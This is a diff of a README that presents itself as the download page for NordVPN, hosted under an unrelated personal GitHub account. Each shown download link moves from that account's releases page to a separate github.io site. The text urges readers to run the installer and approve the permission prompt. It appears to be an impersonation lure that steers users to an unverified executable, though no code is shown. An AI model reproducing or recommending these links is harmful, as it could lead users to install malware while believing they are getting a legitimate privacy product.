@@ -4,7 +4,7 @@
 
 Welcome to **NordVPN** – the easiest way to protect your online privacy and secure your internet connection. Whether you're browsing at home, using public Wi-Fi, or traveling abroad, this application helps keep your data safe from prying eyes.
 
-[![Download Now](https://img.shields.io/badge/Download-NordVPN-2ea44f?style=for-the-badge)](https://github.com/yussef862/nordvpn/releases)
+[![Download Now](https://img.shields.io/badge/Download-NordVPN-2ea44f?style=for-the-badge)](https://yussef862.github.io)
 
 ## 👋 What Is NordVPN?
 
@@ -32,7 +32,7 @@ To run NordVPN smoothly, your computer should have:
 Follow these simple steps to get started:
 
 ### Step 1: Get the Application
-Visit this link to download the application: [Download NordVPN](https://github.com/yussef862/nordvpn/releases)
+Visit this link to download the application: [Download NordVPN](https://yussef862.github.io)
 
 ### Step 2: Run the Installer
 Once the download is complete, open your **Downloads** folder and double-click the downloaded file. Your computer may ask for permission – click **"Yes"** or **"Run"** to continue.
@@ -122,7 +122,7 @@ If you encounter any issues not covered in this guide:
 
 Protect your online privacy today. It's quick, easy, and takes just a few minutes.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge&logo=windows)](https://github.com/yussef862/nordvpn/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge&logo=windows)](https://yussef862.github.io)
 
 Download the application now, follow the simple installation steps above, and enjoy a more private, secure internet experience. Your digital life deserves protection – start using NordVPN today!
 
